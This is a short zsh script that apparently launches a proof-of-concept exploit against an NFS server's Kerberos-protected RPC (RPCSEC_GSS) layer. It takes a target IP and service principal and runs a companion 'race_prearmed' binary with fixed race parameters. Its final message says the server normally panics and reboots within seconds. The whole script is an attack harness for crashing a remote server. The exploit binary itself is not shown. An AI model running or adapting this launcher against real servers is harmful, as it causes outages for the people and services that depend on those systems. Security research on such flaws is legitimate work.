#!/bin/zsh
set -euo pipefail

if (( $# != 2 )); then
  print -u2 "usage: $0 <nfs-server-ip> <service-principal>"
  print -u2 "example: $0 192.168.64.81 nfs@server.example"
  exit 64
fi

: "${KRB5_CONFIG:?set KRB5_CONFIG to the client krb5.conf}"
: "${KRB5CCNAME:?set KRB5CCNAME to a valid credential cache}"

SCRIPT_DIR=${0:A:h}
HOST=$1
SERVICE=$2
CLIENT_TOKEN=${TMPDIR:-/tmp}/rpc_gss_crypto_client_token.bin
SERVER_TOKEN=${TMPDIR:-/tmp}/rpc_gss_crypto_server_token.bin

"$SCRIPT_DIR/rpc_gss_crypto_race_prearmed" \
  "$HOST" "$SERVICE" "$CLIENT_TOKEN" "$SERVER_TOKEN" \
  0 2 2 0 15728640

print "The server normally panics and reboots within a few seconds."
